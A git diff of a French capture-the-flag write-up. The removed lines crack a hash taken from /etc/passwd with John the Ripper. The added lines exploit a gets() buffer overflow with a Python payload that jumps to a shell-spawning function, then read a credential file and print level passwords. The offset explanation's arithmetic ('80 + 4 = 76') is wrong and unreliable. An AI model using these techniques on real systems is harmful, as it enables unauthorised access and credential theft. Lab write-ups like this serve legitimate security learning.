@@ -1,125 +1,94 @@
-# Rapport de Vulnérabilité : Extraction de mot de passe depuis `/etc/passwd` et bruteforce avec John The Ripper
+# Rainfall - Flag 1
 
-## Description
+---
 
-Cette faille repose sur la présence d’un mot de passe hashé directement dans le fichier `/etc/passwd`. En affichant son contenu, on peut repérer une ligne contenant un hash appartenant à l’utilisateur `flag01`. Ce hash peut ensuite être cracké à l’aide de l’outil **John The Ripper** pour obtenir le mot de passe en clair.
+## ⚡ Objectif
 
-## Comment Exploiter la Faille
+Exploiter un dépassement de tampon (**buffer overflow**) sur la stack pour forcer l'exécution de la fonction `run()`.
 
-### Étape 1 : Lecture du fichier `/etc/passwd`
+---
+
+## 📝 Analyse initiale
+
+En désassemblant le binaire `level1`, on observe que `main` contient un appel vulnérable :
+
+```asm
+08048490 <main>:
+  ...
+  call   0x8048340 <gets@plt>
+```
+
+Et juste avant cet appel :
+
+```asm
+sub $0x50, %esp   ; alloue 80 octets pour le buffer
+```
+
+Donc :
+
+* Le buffer local fait **80 octets** (`0x50`)
+* `gets()` ne vérifie **aucune limite** : on peut écrire au-delà de ces 80 octets
+
+Cela signifie qu'on peut **écraser le `saved EBP`, puis l'adresse de retour (`EIP`)**.
+
+---
+
+## 🎯 Fonction cible : `run()`
+
+En analysant la section `.text` du binaire, on trouve une fonction utile :
+
+```asm
+08048444 <run>:
+  call   fwrite@plt
+  call   system@plt    ; avec argument "/bin/sh"
+```
+
+Si on arrive à rediriger l'exécution vers `0x08048444`, la fonction `run()` sera appelée, ce qui ouvrira un shell.
+
+---
+
+## 🔧 Construction du payload
+
+On a testé via stdin un input avec 76 caractères "A", suivi de l'adresse de `run()` :
 
 ```bash
-cat /etc/passwd
+(python -c 'print("A"*76 + "\x44\x84\x04\x08")'; cat) | ./level1
 ```
 
-**Extrait pertinent :**
+**Pourquoi 76 ?**
 
-```
-...
-flag00:x:3000:3000::/home/flag/flag00:/bin/bash  
-flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash  
-flag02:x:3002:3002::/home/flag/flag02:/bin/bash 
-... 
-```
+* 80 (taille du buffer)
+* 4 (bytes du `saved EBP`)
+* \= **76 octets jusqu'à EIP**
 
-On récupère le hash suivant :
+---
 
-```
-42hDRfypTqqnw
-```
+## 🚀 Conséquence : Shell interactif
 
-### Étape 2 : Installation de John The Ripper
+Le programme entre dans la fonction `run()`, qui contient :
 
-Télécharger la version officielle depuis :
-[https://www.openwall.com/john/](https://www.openwall.com/john/)
+* Un `fwrite()` (affichage texte)
+* Un appel à `system("/bin/sh")`
 
-Fichier utilisé :
-**1.9.0 core sources in tar.xz**
-
-Une fois extrait, compiler les sources en suivant la procédure fournie dans le fichier `INSTALL` :
+On obtient donc un **shell avec les droits de level2** :
 
 ```bash
-make clean generic
-```
+whoami
+# level2
 
-L’exécutable `john` est maintenant disponible dans le dossier `run`.
+cat /home/user/level2/.pass
+# 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 
-### Étape 3 : Création du fichier contenant le hash
-
-Créer un fichier `file.txt` contenant :
-
-```
-42hDRfypTqqnw
-```
-
-### Étape 4 : Cracker le mot de passe
-
-Lancer John sur le fichier :
-
-```bash
-run/john file.txt
-```
-
-Une fois terminé, afficher le mot de passe trouvé :
-
-```bash
-run/john --show file.txt
-```
-
-**Mot de passe obtenu :**
-
-```
-?:abcdefg
-```
-
-### Étape 5 : Connexion au compte `flag01`
-
-```bash
-su flag01
-```
-
-**Mot de passe :**
-
-```
-abcdefg
-```
-
-### Étape 6 : Récupération du flag
-
-```bash
-getflag
-```
-
-**Flag obtenu :**
-
-```
-f2av5il02puano7naaf6adaaf
-```
-
-### Étape 6 : Passage au niveau suivant
-
-```bash
-su level02
-```
-
-**Mot de passe :**
-
-```
-f2av5il02puano7naaf6adaaf
+su level2
+# Entrer le flag comme mot de passe
 ```
 
 ---
 
-## Comment Résoudre la Faille
+## 📅 Résumé
 
-Pour corriger cette vulnérabilité :
-
-* **Ne jamais stocker les mots de passe dans `/etc/passwd`** : Ils doivent être stockés dans `/etc/shadow`, qui est lisible uniquement par root.
-* **Utiliser des algorithmes de hachage robustes** : Le format de hash utilisé ici est trop faible et facilement bruteforcable.
-* **Restreindre les accès aux fichiers système** : Assurez-vous que les utilisateurs ne peuvent lire que ce qui leur est strictement nécessaire.
-
-## Conclusion
-
-Cette vulnérabilité montre qu’un simple accès en lecture à un fichier système mal configuré peut exposer des mots de passe utilisateurs. Une séparation claire des fichiers sensibles, une politique de hachage robuste et un contrôle des permissions sont essentiels pour sécuriser un système Unix.
-
----
+* ✅ Buffer overflow via `gets()` sans vérification de taille
+* ✅ Offset trouvé : **76 octets jusqu'à EIP**
+* ✅ Adresse de la fonction `run()` : `0x08048444`
+* ✅ Payload : `"A"*76 + addr(run)`
+* ✅ Shell obtenu → Flag récupéré avec `cat`
